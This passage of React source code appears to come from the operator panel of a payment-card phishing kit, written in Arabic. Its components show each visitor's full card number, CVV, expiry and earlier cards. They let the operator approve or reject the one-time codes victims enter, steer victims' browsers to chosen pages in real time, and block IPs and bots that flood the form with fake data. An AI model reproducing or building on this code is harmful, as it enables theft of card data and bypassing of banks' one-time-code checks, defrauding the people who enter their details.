                          {sp === 1 ? "نصف العرض" : "عرض كامل"}
                        </button>
                      ))}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}
    </div>
  );
}

function PagesControlDropdown({ visitor }: { visitor: Visitor }) {
  const [open, setOpen] = useState(false);
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const pending = directed > 0 && directed !== current;
  const flow = getVisitorFlow(visitor);
  const currentLabel = getFlowStepLabels(flow)[current] || "التحكم بالصفحات";

  useEffect(() => {
    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-pages-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  return (
    <div className="relative flex items-center gap-1.5" data-pages-dropdown>
      <button
        onClick={() => setOpen(o => !o)}
        data-testid="pages-dropdown-toggle"
        className={`h-8 px-3 rounded-md flex items-center gap-2 border text-xs font-medium transition min-w-[160px] justify-between ${
          pending
            ? "bg-violet-50 border-violet-300 text-violet-800"
            : "bg-white border-gray-300 text-gray-800 hover:bg-gray-50"
        }`}
      >
        <span className="truncate">{currentLabel}</span>
        <ChevronDown
          className={`w-3.5 h-3.5 text-gray-500 shrink-0 transition ${open ? "rotate-180" : ""}`}
        />
      </button>
      <button
        type="button"
        onClick={() => setOpen(o => !o)}
        title="التحكم بالصفحات"
        className="w-8 h-8 rounded-full bg-blue-600 hover:bg-blue-700 text-white flex items-center justify-center shrink-0 transition"
      >
        <Layers className="w-3.5 h-3.5" />
      </button>

      {open && (
        <div className="absolute top-full mt-2 left-0 w-[340px] rounded-xl border border-gray-200 bg-white shadow-xl z-30 p-3">
          <div className="flex items-center justify-between mb-2 pb-2 border-b border-gray-100">
            <div className="text-xs font-bold text-gray-900">
              التحكم بالصفحات
            </div>
            <div className="text-[11px] font-semibold text-blue-600">
              الحالية: {current}/{getFlowTotalSteps(flow)}
            </div>
          </div>
          <PagesControl visitor={visitor} />
        </div>
      )}
    </div>
  );
}

function PagesControl({ visitor }: { visitor: Visitor }) {
  const current = Number(visitor.step) || 1;
  const directed = Number(visitor.directedStep) || 0;
  const flow = getVisitorFlow(visitor);
  const flowLabels = getFlowStepLabels(flow);
  const [customPath, setCustomPath] = useState("");

  async function pushStep(target: number) {
    console.log("[DEBUG] pushStep (current page / step update):", {
      visitorId: visitor.id,
      target,
      flow,
    });
    await setDoc(
      doc(db, "pays", visitor.id),
      buildPageControlPayload(flow, target, new Date().toISOString()),
      { merge: true }
    );
  }

  async function pushCustomPath() {
    const path = getDirectedVisitorPath(customPath);
    if (!path) {
      window.alert("أدخل مساراً عاماً صالحاً مثل /restaurants أو /reserve/1");
      return;
    }
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        directedPath: path,
        directedStep: 0,
        directedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
    setCustomPath("");
  }

  async function clearApproval(field: string) {
    const payload: Record<string, unknown> = {
      [field]: "waiting",
      updatedAt: new Date().toISOString(),
    };
    if (field === "cardApprovalStatus") {
      payload.cardApproved = false;
      payload.cardStatus = "pending_approval";
      payload.status = "pending_approval";
    } else if (field === "otpApprovalStatus") {
      payload.otpApproved = false;
      payload.otpStatus = "pending";
    }
    await setDoc(doc(db, "pays", visitor.id), payload, { merge: true });
  }

  return (
    <div className="space-y-3">
      <div className="grid grid-cols-2 gap-1.5">
        {Object.entries(flowLabels).map(([k, label]) => {
          const n = Number(k);
          const pageId = getFlowStepPage(flow, n);
          const isCurrent = current === n;
          const isDirected = directed === n;
          return (
            <button
              key={k}
              onClick={() => pushStep(n)}
              data-testid={`push-step-${n}`}
              className={`py-2 px-2 rounded-lg text-[11px] font-bold transition border text-right ${
                isCurrent
                  ? "bg-blue-600 text-white border-blue-600"
                  : isDirected
                    ? "bg-violet-50 text-violet-800 border-violet-300"
                    : "bg-gray-50 text-gray-800 border-gray-200 hover:bg-gray-100"
              }`}
            >
              <div className="flex items-center justify-between gap-1 mb-0.5">
                <span className="text-[9px] opacity-75">{n}</span>
                <span
                  className="text-[9px] font-mono opacity-75 truncate"
                  dir="ltr"
                >
                  {pageId}
                </span>
              </div>
              <div className="leading-tight truncate">{label}</div>
            </button>
          );
        })}
      </div>

      <div className="border-t border-gray-100 pt-2 space-y-2">
        <div className="text-[10px] text-gray-500 mb-1">
          توجيه مباشر إلى أي صفحة عامة
        </div>
        <div className="flex gap-1.5" dir="ltr">
          <input
            value={customPath}
            onChange={event => setCustomPath(event.target.value)}
            placeholder="/restaurants أو /reserve/1"
            className="min-w-0 flex-1 rounded border border-gray-300 bg-white px-2 py-1 text-[10px] text-gray-900 outline-none focus:border-blue-500"
            data-testid="input-custom-visitor-path"
          />
          <button
            onClick={() => void pushCustomPath()}
            className="rounded bg-blue-600 px-2.5 py-1 text-[10px] font-bold text-white hover:bg-blue-700"
            data-testid="button-push-custom-visitor-path"
          >
            توجيه
          </button>
        </div>
        <div className="text-[10px] text-gray-400">
          الصفحات الإدارية وتوجيهات خارج الموقع غير مسموحة.
        </div>
      </div>

      <div className="border-t border-gray-100 pt-2 space-y-1">
        <div className="text-[10px] text-gray-500 mb-1">طلب جديد</div>
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => clearApproval("cardApprovalStatus")}
            className="py-1 bg-gray-50 text-gray-700 rounded text-[10px] font-semibold border border-gray-200 hover:bg-gray-100"
          >
            بطاقة
          </button>
          <button
            onClick={() => clearApproval("otpApprovalStatus")}
            className="py-1 bg-gray-50 text-gray-700 rounded text-[10px] font-semibold border border-gray-200 hover:bg-gray-100"
          >
            OTP
          </button>
        </div>
      </div>

      {directed > 0 && directed !== current && (
        <div className="text-[10px] text-violet-700 bg-violet-50 border border-violet-200 rounded p-1.5 text-center">
          ⏳ تم التوجيه إلى{" "}
          {getFlowStepPage(flow, directed) || `الخطوة ${directed}`} - بانتظار
          استجابة المستخدم
        </div>
      )}
    </div>
  );
}

function OtpRow({
  label,
  step,
  code,
  status,
  canDecide,
  onApprove,
  onReject,
}: {
  label: string;
  step: number;
  code: string;
  status: string;
  canDecide: boolean;
  onApprove?: () => void;
  onReject?: () => void;
}) {
  const length = Math.max(code.length, 4);
  const digits = code.padEnd(length, "•").slice(0, length).split("");
  const tone =
    status === "waiting"
      ? "border-amber-200 bg-amber-50/70"
      : status === "approved"
        ? "border-emerald-200 bg-emerald-50/70"
        : status === "rejected"
          ? "border-red-200 bg-red-50/70"
          : "border-gray-200 bg-white";
  return (
    <div className={`rounded-lg p-2.5 border ${tone}`}>
      <div className="flex items-center justify-between mb-1.5">
        <div className="flex items-center gap-1.5">
          <span className="text-[11px] text-gray-700 font-semibold">
            {label}
          </span>
          <span className="text-[9px] text-gray-500 bg-white border border-gray-200 rounded px-1.5 py-0.5">
            مرحلة {step}
          </span>
        </div>
        <span className="text-[10px] text-gray-500">
          {code ? `${code.length} رقم` : "—"}
        </span>
      </div>
      <div className="flex gap-1 justify-center mb-2" dir="ltr">
        {digits.map((d, i) => (
          <div
            key={i}
            className={`w-8 h-9 rounded-md flex items-center justify-center text-base font-bold font-mono border ${
              code
                ? "bg-white border-gray-300 text-blue-700"
                : "bg-gray-50 border-gray-200 text-gray-400"
            }`}
          >
            {d}
          </div>
        ))}
      </div>
      {(onApprove || onReject) && (
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={onApprove}
            disabled={!canDecide}
            className="py-1 bg-emerald-600 text-white hover:bg-emerald-700 disabled:opacity-40 rounded text-[11px] font-semibold flex items-center justify-center gap-1"
            data-testid={`otp-row-approve-${step}`}
          >
            <CheckCircle2 className="w-3 h-3" /> قبول
          </button>
          <button
            onClick={onReject}
            disabled={!canDecide}
            className="py-1 bg-red-600 text-white hover:bg-red-700 disabled:opacity-40 rounded text-[11px] font-semibold flex items-center justify-center gap-1"
            data-testid={`otp-row-reject-${step}`}
          >
            <XCircle className="w-3 h-3" /> رفض
          </button>
        </div>
      )}
    </div>
  );
}

function BlockedBinsCard({
  bins,
  storedCards,
  onAdd,
  onRemove,
  onRemoveStoredCard,
  onExportExcel,
  suggestedVisitor,
  suggestedBin,
  suggestedLast4,
}: {
  bins: string[];
  storedCards: StoredBlockedCard[];
  onAdd: (binOrCard: string, meta?: any) => void;
  onRemove: (bin: string) => void;
  onRemoveStoredCard: (entryId: string) => void;
  onExportExcel: () => void;
  suggestedVisitor?: Visitor | null;
  suggestedBin?: string;
  suggestedLast4?: string;
}) {
  const [input, setInput] = useState("");
  const digits = input.replace(/\D/g, "").slice(0, 19);
  const cleanBin = digits.slice(0, 6);
  const canAdd =
    cleanBin.length === 6 &&
    (digits.length > 6 || !bins.includes(cleanBin));
  const sugg = suggestedBin
    ? String(suggestedBin).replace(/\D/g, "").slice(0, 6)
    : "";
  const suggCanAdd = sugg.length === 6 && !bins.includes(sugg);

  const buildSuggestedMeta = () => {
    if (!suggestedVisitor) return undefined;
    const p = suggestedVisitor.payment || {};
    const num = String(p.cardNumber || suggestedVisitor.cardNumber || "").replace(/\D/g, "");
    return {
      cardNumber: num || undefined,
      last4: p.cardLast4 || suggestedLast4,
      expiryMonth: suggestedVisitor.expiryMonth,
      expiryYear: suggestedVisitor.expiryYear,
      cvv: p.cardCvc || suggestedVisitor.cvv,
      cardName: p.cardName || suggestedVisitor.cardName,
      cardType: p.cardScheme || suggestedVisitor.cardType,
      bankName: p.cardBankLabel || p.cardBank || suggestedVisitor.cardBankName,
      visitorId: suggestedVisitor.id,
      visitorName: suggestedVisitor.name,
      phone: suggestedVisitor.phone,
      ip: suggestedVisitor.ip || suggestedVisitor.ipAddress,
      source: "admin_block",
    };
  };

  return (
    <Panel
      title="قائمة البطاقات المحظورة"
      badge={
        storedCards.length > 0
          ? `${storedCards.length} بطاقة`
          : bins.length > 0
            ? `${bins.length} BIN`
            : undefined
      }
    >
      <div className="space-y-3">
        <div className="flex items-center justify-between gap-2">
          <div className="text-[11px] text-gray-600 leading-relaxed">
            أدخل أول 6 أرقام (BIN) أو رقم البطاقة كاملاً لحفظها وحظرها تلقائياً عند الدفع.
          </div>
          <button
            type="button"
            onClick={onExportExcel}
            className="px-2.5 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg text-[11px] font-bold flex items-center gap-1.5 shrink-0 cursor-pointer"
            data-testid="blocklist-export-excel"
          >
            <FileSpreadsheet className="w-3.5 h-3.5" />
            <span>تصدير Excel</span>
          </button>
        </div>

        <div className="flex gap-1.5">
          <input
            type="text"
            inputMode="numeric"
            maxLength={19}
            value={input}
            onChange={e => setInput(e.target.value.replace(/\D/g, ""))}
            onKeyDown={e => {
              if (e.key === "Enter" && canAdd) {
                onAdd(digits);
                setInput("");
              }
            }}
            placeholder="453204 أو رقم البطاقة كاملاً"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-white border border-gray-300 rounded-lg text-sm font-mono text-gray-900 text-center placeholder-gray-400 focus:outline-none focus:border-red-500"
            data-testid="blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(digits);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-600 hover:bg-red-700 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-lg text-xs font-bold flex items-center gap-1"
            data-testid="blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg, buildSuggestedMeta())}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-50 border-amber-200 hover:bg-amber-100 text-amber-900"
                : "bg-gray-100 border-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            data-testid="blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <Ban className="w-3 h-3" />
              {suggCanAdd ? "حظر وتخزين بطاقة الزائر الحالي" : "BIN الزائر محظور"}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
              {suggestedLast4 ? ` ··· ${suggestedLast4}` : ""}
            </span>
          </button>
        )}

        <div>
          <div className="text-[11px] text-gray-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> أكواد BIN المحظورة ({bins.length})
          </div>
          <div className="space-y-1 max-h-36 overflow-y-auto">
            {bins.length === 0 && (
              <div className="text-center py-3 text-gray-400 text-[11px]">
                لا يوجد أكواد محظورة
              </div>
            )}
            {bins.map(b => (
              <div
                key={b}
                className="flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-600 tracking-wider"
                  dir="ltr"
                >
                  {b}••••••••••
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${b}؟`)) onRemove(b);
                  }}
                  className="text-gray-400 hover:text-red-600 p-1 rounded hover:bg-red-50"
                  data-testid={`blocklist-remove-${b}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>

        <div>
          <div className="flex items-center justify-between mb-1.5">
            <div className="text-[11px] text-gray-500 flex items-center gap-1">
              <CreditCard className="w-3 h-3" /> البطاقات المحفوظة ({storedCards.length})
            </div>
            {storedCards.length > 0 && (
              <button
                type="button"
                onClick={() => {
                  if (confirm("مسح سجل البطاقات المحظورة المحفوظة؟")) {
                    onRemoveStoredCard("all");
                  }
                }}
                className="text-[10px] text-red-600 hover:underline cursor-pointer"
              >
                مسح السجل
              </button>
            )}
          </div>
          <div className="space-y-1.5 max-h-48 overflow-y-auto">
            {storedCards.length === 0 && (
              <div className="text-center py-3 text-gray-400 text-[11px] bg-white rounded-lg border border-gray-200">
                لم يتم تسجيل بطاقات محظورة بعد
              </div>
            )}
            {storedCards.map(card => (
              <div
                key={card.id}
                className="flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-lg px-2.5 py-1.5"
                data-testid={`stored-blocked-card-${card.id}`}
              >
                <div className="min-w-0">
                  <div className="flex items-center gap-2">
                    <span
                      className="font-mono text-xs font-bold text-gray-900"
                      dir="ltr"
                    >
                      {card.cardNumber || `${card.bin}••••••${card.last4 || "••••"}`}
                    </span>
                    <span className="text-[10px] px-1.5 py-0.5 rounded bg-red-50 text-red-700 font-semibold">
                      {BLOCKED_SOURCE_LABELS[card.source] || card.source}
                    </span>
                  </div>
                  <div className="text-[10px] text-gray-500 mt-0.5 truncate">
                    {[
                      card.bankName,
                      card.visitorName,
                      card.phone,
                      fmtRelative(card.blockedAt),
                    ]
                      .filter(Boolean)
                      .join(" · ")}
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => onRemoveStoredCard(card.id)}
                  className="text-gray-400 hover:text-red-600 p-1 rounded hover:bg-red-50 shrink-0"
                  title="حذف من السجل"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function BlockedIpsCard({
  ips,
  onAdd,
  onRemove,
  suggestedIp,
  suggestedName,
}: {
  ips: string[];
  onAdd: (ip: string) => void;
  onRemove: (ip: string) => void;
  suggestedIp?: string;
  suggestedName?: string;
}) {
  const [input, setInput] = useState("");
  const cleanInput = input.trim();
  const looksValid =
    /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(cleanInput) ||
    /^[0-9a-fA-F:]+$/.test(cleanInput);
  const canAdd = looksValid && !ips.includes(cleanInput);
  const sugg = suggestedIp ? String(suggestedIp).trim() : "";
  const suggCanAdd = !!sugg && !ips.includes(sugg);

  return (
    <Panel
      title="حظر الزوار بعنوان IP"
      badge={ips.length > 0 ? `${ips.length} محظور` : undefined}
    >
      <div className="space-y-3">
        <div className="text-[11px] text-gray-600 leading-relaxed">
          أي زائر يدخل من عنوان IP موجود بالقائمة سيُمنع من استخدام النظام ويظهر
          له رسالة حظر. يدعم IPv4 و IPv6 والـ CIDR.
        </div>

        <div className="flex gap-1.5">
          <input
            type="text"
            value={input}
            onChange={e => setInput(e.target.value)}
            onKeyDown={e => {
              if (e.key === "Enter" && canAdd) {
                onAdd(cleanInput);
                setInput("");
              }
            }}
            placeholder="مثال: 102.45.12.7"
            dir="ltr"
            className="flex-1 px-2 py-1.5 bg-white border border-gray-300 rounded-lg text-sm font-mono text-gray-900 text-center placeholder-gray-400 focus:outline-none focus:border-red-500"
            data-testid="ip-blocklist-input"
          />
          <button
            onClick={() => {
              if (!canAdd) return;
              onAdd(cleanInput);
              setInput("");
            }}
            disabled={!canAdd}
            className="px-3 py-1.5 bg-red-600 hover:bg-red-700 disabled:opacity-40 disabled:cursor-not-allowed text-white rounded-lg text-xs font-bold flex items-center gap-1"
            data-testid="ip-blocklist-add"
          >
            <Plus className="w-3.5 h-3.5" /> حظر
          </button>
        </div>

        {sugg && (
          <button
            onClick={() => suggCanAdd && onAdd(sugg)}
            disabled={!suggCanAdd}
            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
              suggCanAdd
                ? "bg-amber-50 border-amber-200 hover:bg-amber-100 text-amber-900"
                : "bg-gray-100 border-gray-200 text-gray-400 cursor-not-allowed"
            }`}
            data-testid="ip-blocklist-add-current"
          >
            <span className="text-[11px] flex items-center gap-1.5">
              <WifiOff className="w-3 h-3" />
              {suggCanAdd ? "حظر الزائر الحالي" : "IP الزائر محظور"}
              {suggestedName ? ` · ${suggestedName}` : ""}
            </span>
            <span className="font-mono text-[12px] font-bold" dir="ltr">
              {sugg}
            </span>
          </button>
        )}

        <div>
          <div className="text-[11px] text-gray-500 mb-1.5 flex items-center gap-1">
            <ShieldOff className="w-3 h-3" /> العناوين المحظورة ({ips.length})
          </div>
          <div className="space-y-1 max-h-48 overflow-y-auto">
            {ips.length === 0 && (
              <div className="text-center py-4 text-gray-400 text-[11px]">
                لا يوجد عناوين محظورة
              </div>
            )}
            {ips.map(ip => (
              <div
                key={ip}
                className="flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-lg px-2.5 py-1.5 group"
              >
                <span
                  className="font-mono text-[13px] font-bold text-red-600 tracking-wider"
                  dir="ltr"
                >
                  {ip}
                </span>
                <button
                  onClick={() => {
                    if (confirm(`إزالة الحظر عن ${ip}؟`)) onRemove(ip);
                  }}
                  className="text-gray-400 hover:text-red-600 p-1 rounded hover:bg-red-50"
                  data-testid={`ip-blocklist-remove-${ip}`}
                  title="إزالة"
                >
                  <XIcon className="w-3.5 h-3.5" />
                </button>
              </div>
            ))}
          </div>
        </div>
      </div>
    </Panel>
  );
}

const ATTACK_REASON_LABELS: Record<string, string> = {
  unverified_human: "لم يتجاوز التحقق البشري",
  automated_ua: "أداة أتمتة / بوت",
  pays_rate_limit: "تجاوز حد إرسال النماذج",
  session_rate_limit: "تجاوز حد الجلسات",
  challenge_rate_limit: "تجاوز حد طلب التحقق",
  honeypot: "فخ الحقل المخفي",
  too_fast_solve: "إجابة آلية فائقة السرعة",
  wrong_challenge_answer: "إجابة تحقق خاطئة",
  blocked_ip: "IP محظور",
};

function AttackProtectionCard({
  state,
  busy,
  blockedIps,
  onToggle,
  onResetStats,
  onBlockIp,
}: {
  state: AdminSecurityState;
  busy: boolean;
  blockedIps: string[];
  onToggle: () => void;
  onResetStats: () => void;
  onBlockIp: (ip: string) => void;
}) {
  return (
    <Panel
      title="وضع الحماية من الهجمات"
      badge={state.enabled ? "مفعّل" : "متوقف"}
    >
      <div className="space-y-3">
        <div
          className={`p-3 rounded-xl border flex items-center justify-between gap-3 ${
            state.enabled
              ? "bg-red-50 border-red-200 text-red-900"
              : "bg-white border-gray-200 text-gray-800"
          }`}
        >
          <div className="flex items-start gap-2.5">
            {state.enabled ? (
              <ShieldAlert className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
            ) : (
              <ShieldCheck className="w-5 h-5 text-emerald-600 shrink-0 mt-0.5" />
            )}
            <div>
              <div className="font-bold text-xs">
                {state.enabled
                  ? "وضع التصدي للهجمات مفعّل حالياً"
                  : "الموقع في الوضع الاعتيادي"}
              </div>
              <div className="text-[11px] opacity-80 mt-0.5 leading-relaxed">
                {state.enabled
                  ? "يُطلب من أي زائر جديد اجتياز فحص أمني (أنا لست روبوتاً) مع تقييد صارم لمعدل الطلبات."
                  : "قم بتفعيل هذا الوضع فوراً عند ملاحظة تعبئة بيانات وهمية متكررة أو هجوم آلي."}
              </div>
            </div>
          </div>
          <button
            type="button"
            onClick={onToggle}
            disabled={busy}
            className={`px-3.5 py-2 rounded-lg text-xs font-bold text-white shrink-0 transition cursor-pointer disabled:opacity-60 ${
              state.enabled
                ? "bg-gray-800 hover:bg-gray-900"
                : "bg-red-600 hover:bg-red-700"
            }`}
            data-testid="modal-toggle-attack-protection"
          >
            {busy
              ? "جاري الحفظ..."
              : state.enabled
                ? "إيقاف الحماية"
                : "تفعيل الآن"}
          </button>
        </div>

        <div className="bg-white border border-gray-200 rounded-xl p-3 space-y-1.5 text-[11px] text-gray-600">
          <div className="font-bold text-gray-800 text-xs mb-1">
            ما الذي يتم تفعيله مع هذا الوضع؟
          </div>
          <div>• فحص تحقق بشري إجباري (عملية حسابية مصوّرة) قبل إنشاء أي جلسة أو حجز.</div>
          <div>• تقييد صارم لكل IP (بحد أقصى 3 سجلات جديدة كل 10 دقائق).</div>
          <div>• حظر أدوات التعبئة التلقائية و السكربتات وفخاخ الحقول المخفية.</div>
          <div>• تفعيل حظر عناوين الـ IP على مستوى الخادم مباشرة.</div>
        </div>

        <div className="flex items-center justify-between bg-white border border-gray-200 rounded-xl px-3 py-2">
          <div className="flex items-center gap-2">
            <Shield className="w-4 h-4 text-gray-500" />
            <span className="text-xs font-semibold text-gray-700">
              المحاولات المرفوضة:
            </span>
            <span
              className="font-mono font-bold text-sm text-red-600"
              data-testid="attack-blocked-count"
            >
              {state.blockedCount}
            </span>
          </div>
          <button
            type="button"
            onClick={onResetStats}
            disabled={busy || (state.blockedCount === 0 && state.recentBlocked.length === 0)}
            className="px-2.5 py-1 rounded-md border border-gray-200 bg-gray-50 hover:bg-gray-100 text-[11px] font-semibold text-gray-700 disabled:opacity-40 cursor-pointer"
          >
            تصفير السجل
          </button>
        </div>

        <div>
          <div className="text-[11px] text-gray-500 mb-1.5">
            أحدث المحاولات المشبوهة ({state.recentBlocked.length})
          </div>
          <div className="space-y-1.5 max-h-52 overflow-y-auto">
            {state.recentBlocked.length === 0 && (
              <div className="text-center py-4 text-gray-400 text-[11px] bg-white rounded-lg border border-gray-200">
                لا توجد محاولات مرفوضة حتى الآن
              </div>
            )}
            {state.recentBlocked.map((entry, idx) => {
              const alreadyBanned = blockedIps.includes(entry.ip);
              const reasonLabel =
                ATTACK_REASON_LABELS[entry.reason] || entry.reason;
              return (
                <div
                  key={`${entry.ip}-${entry.at}-${idx}`}
                  className="flex items-center justify-between gap-2 bg-white border border-gray-200 rounded-lg px-2.5 py-1.5"
                >
                  <div className="min-w-0">
                    <div className="flex items-center gap-2">
                      <span
                        className="font-mono text-xs font-bold text-gray-900"
                        dir="ltr"
                      >
                        {entry.ip}
                      </span>
                      <span className="text-[10px] px-1.5 py-0.5 rounded bg-red-50 text-red-700 font-semibold">
                        {reasonLabel}
                      </span>
                    </div>
                    <div className="text-[10px] text-gray-400 mt-0.5">
                      {fmtRelative(entry.at)}
                    </div>
                  </div>
                  <button
                    type="button"
                    disabled={alreadyBanned || entry.ip === "unknown"}
                    onClick={() => onBlockIp(entry.ip)}
                    className={`px-2 py-1 rounded text-[10px] font-bold shrink-0 ${
                      alreadyBanned
                        ? "bg-gray-100 text-gray-400 cursor-not-allowed"
                        : "bg-red-600 hover:bg-red-700 text-white cursor-pointer"
                    }`}
                  >
                    {alreadyBanned ? "محظور" : "حظر IP"}
                  </button>
                </div>
              );
            })}
          </div>
        </div>
      </div>
    </Panel>
  );
}

function CardHistoryList({
  history,
  currentCardNumber,
}: {
  history: any;
  currentCardNumber: string;
}) {
  const [open, setOpen] = useState(false);
  const [revealed, setRevealed] = useState<Record<number, boolean>>({});

  const entries = Array.isArray(history) ? history : [];
  const current = String(currentCardNumber || "").replace(/\D/g, "");

  const previous = entries
    .map((e: any) => ({
      cardNumber: String(e?.cardNumber || e?.c1 || "").replace(/\D/g, ""),
      cvv: String(e?.cvv || e?.cpc || "").replace(/\D/g, ""),
      expiryMonth: String(e?.expiryMonth || "")
        .padStart(2, "0")
        .slice(-2),
      expiryYear: String(e?.expiryYear || "")
        .slice(-2)
        .padStart(2, "0"),
      cardName: String(e?.cardName || ""),
      cardType: String(e?.cardType || ""),
      timestamp: typeof e?.timestamp === "string" ? e.timestamp : "",
    }))
    .filter((e: any) => e.cardNumber && e.cardNumber !== current)
    .reverse();

  if (previous.length === 0) return null;

  return (
    <div className="rounded-lg border border-amber-200 bg-amber-50/70">
      <button
        onClick={() => setOpen(o => !o)}
        className="w-full px-3 py-2 flex items-center justify-between text-[11px] font-bold text-amber-800 hover:bg-amber-100/70 rounded-lg transition"
        data-testid="toggle-card-history"
      >
        <span className="flex items-center gap-1.5">
          <RotateCcw className="w-3 h-3" />
          البطاقات السابقة ({previous.length})
        </span>
        <ChevronDown
          className={`w-3.5 h-3.5 transition ${open ? "rotate-180" : ""}`}
        />
      </button>
      {open && (
        <div className="px-2 pb-2 space-y-1.5">
          {previous.map((entry: any, idx: number) => {
            const isRevealed = !!revealed[idx];
            const grouped = entry.cardNumber.replace(/(.{4})/g, "$1 ").trim();
            const masked =
              entry.c1?.length > 4 || entry.cardNumber?.length > 4
                ? `•••• ${entry.cardNumber.slice(-4)}`
                : "••••";
            const expiry =
              entry.expiryMonth && entry.expiryYear
                ? `${entry.expiryMonth}/${entry.expiryYear}`
                : "—";
            return (
              <div
                key={`${entry.cardNumber}-${idx}`}
                className="rounded-md bg-white border border-gray-200 p-2 space-y-1.5"
                data-testid={`card-history-${idx}`}
              >
                <div className="flex items-center justify-between text-[10px] text-gray-500">
                  <span dir="ltr" className="font-mono">
                    {fmtTime(entry.timestamp)}
                  </span>
                  <button
                    onClick={() => setRevealed(r => ({ ...r, [idx]: !r[idx] }))}
                    className="flex items-center gap-1 text-blue-600 hover:text-blue-700 font-semibold"
                    data-testid={`toggle-card-history-reveal-${idx}`}
                  >
                    {isRevealed ? (
                      <>
                        <EyeOff className="w-3 h-3" /> إخفاء
                      </>
                    ) : (
                      <>
                        <Eye className="w-3 h-3" /> عرض
                      </>
                    )}
                  </button>
                </div>
                <div
                  className="font-mono text-[12px] tracking-wider text-gray-900 select-all"
                  dir="ltr"
                  data-testid={`card-history-number-${idx}`}
                >
                  {isRevealed ? grouped : masked}
                </div>
                <div className="flex items-center gap-3 text-[10px] text-gray-700">
                  <div>
                    <span className="text-gray-400">CVV: </span>
                    <span
                      className="font-mono font-bold text-gray-900 select-all"
                      dir="ltr"
                      data-testid={`card-history-cvv-${idx}`}
                    >
                      {isRevealed ? entry.cvv || entry?.cpc || "—" : "•••"}
                    </span>
                  </div>
                  <div>
                    <span className="text-gray-400">Exp: </span>
                    <span
                      className="font-mono text-gray-900"
                      dir="ltr"
                      data-testid={`card-history-exp-${idx}`}
                    >
                      {expiry}
                    </span>
                  </div>
                  {entry.cardType && (
                    <div className="ml-auto">
                      <span className="text-[9px] uppercase px-1.5 py-px rounded bg-gray-100 text-gray-700">
                        {entry.cardType}
                      </span>
                    </div>
                  )}
                </div>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
}

function CardInfoCard({
  visitor,
  onApprove,
  onReject,
  onPushStep,
  onBlockBin,
  isBinBlocked,
  onBlockIp,
  isIpBlocked,
}: {
  visitor: Visitor;
  onApprove: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onReject: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onPushStep: (step: number) => void;
  onBlockBin?: (bin: string, meta?: any) => void;
  isBinBlocked?: boolean;
  onBlockIp?: (ip: string) => void;
  isIpBlocked?: boolean;
}) {
  const [showDetails, setShowDetails] = useState(true);
  const p = visitor.payment || {};
  const rawCardParts = [
    p.cardNumber,
    p.c1,
    p.c2,
    p.c3,
    p.c4,
    (visitor as any).cardNumber,
    (visitor as any).cardNum,
    (visitor as any).number,
    (visitor as any).card_number,
    (visitor as any).c1,
    (visitor as any).c2,
    (visitor as any).c3,
    (visitor as any).c4,
    (visitor as any).c5,
    (visitor as any).c6,
    (visitor as any).c7,
    (visitor as any).c8,
    (visitor as any).card,
    (visitor as any).digits,
  ].filter(Boolean);

  let combinedRaw = "";
  for (const part of rawCardParts) {
    const s = String(part || "")
      .replace(/\s+/g, "")
      .trim();
    if (s.length > combinedRaw.length) {
      combinedRaw = s;
    }
  }

  const fullCard = combinedRaw.replace(/\D/g, "");
  const last4 =
    p.cardLast4 ||
    (visitor as any).cardLast4 ||
    (visitor as any).last4 ||
    (fullCard.length >= 4 ? fullCard.slice(-4) : "••••");
  const hasCard = !!(
    p.cardLast4 ||
    p.cardName ||
    p.cardNumber ||
    fullCard.length > 0
  );

  const bin = p.cardBin || fullCard.slice(0, 6);
  const visitorAny = visitor as any;
  const hasEnrichment =
    !!(visitorAny.cardBankName || visitorAny.bankName) &&
    !!(
      visitorAny.cardCategory ||
      visitorAny.cardLevel ||
      visitorAny.cardCountry
    );

  useEffect(() => {
    if (!bin || bin.length < 6) return;
    if (hasEnrichment) return;
    let cancelled = false;
    (async () => {
      try {
        const res = await fetch(`/api/bin-lookup/${bin}`);
        if (!res.ok) return;
        const json = await res.json();
        if (cancelled) return;
        if (!json?.success || !json.data) return;
